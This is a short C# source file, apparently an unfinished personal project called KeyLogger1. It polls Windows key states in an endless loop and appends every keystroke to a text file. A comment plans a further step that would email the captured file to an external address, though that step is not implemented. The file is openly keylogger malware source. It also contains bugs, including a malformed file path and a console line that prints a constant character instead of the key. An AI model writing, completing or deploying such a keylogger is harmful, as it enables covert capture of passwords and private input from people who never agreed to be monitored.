using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger1
{
    public static class Program
    {
        [DllImport("User32.dll")]
        private static extern int GetAsyncKeyState(int i);

        // String to hold all the keystrokes
        static string kellog = " ";
        static void Main(string[] args)
        {
            var filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
        {
            Directory.CreateDirectory(filepath);
        }

        var path = filepath + @"C:\Documents\keystrokes.txt";

            if (File.Exists(path))
        {
            using var sw = File.CreateText(path);
        }
        // plan
           
        // 1 - Capture keystrokes and display them
        while (true)
        {
            // Pause and let other programs get a chance to run
            Thread.Sleep(5);

            // Check all the keys for their state
            for (var i = 32; i < 180; i++)
            {
                var keyState = GetAsyncKeyState(i);
                if (keyState != -32767) continue;
                Console.WriteLine((char) 1 + ", ");

                // 2 - Store the strokes into a text file

                using var sw = File.AppendText(path);
                sw.Write((char) i);

            }

            // Print to the console
        }

           

        // 3 - Periodically send the contents of the file to and external email address
    }

}
}
